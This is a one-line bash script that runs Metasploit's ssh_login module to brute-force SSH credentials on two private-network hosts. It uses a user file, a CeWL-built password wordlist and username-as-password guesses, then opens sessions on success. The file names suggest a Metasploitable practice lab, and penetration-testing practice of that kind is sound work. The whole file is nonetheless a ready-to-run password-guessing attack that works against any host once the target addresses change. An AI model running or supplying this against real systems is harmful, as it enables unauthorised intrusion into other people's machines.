#!/bin/bash

msfconsole -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.56.102 192.168.56.112; set BRUTEFORCE_SPEED 1; set USER_FILE metasploitable_users.txt; set PASS_FILE metasploitable_cewl_wordlist_2.txt; set STOP_ON_SUCCESS true; set USER_AS_PASS true; set VERBOSE true; run; sessions"
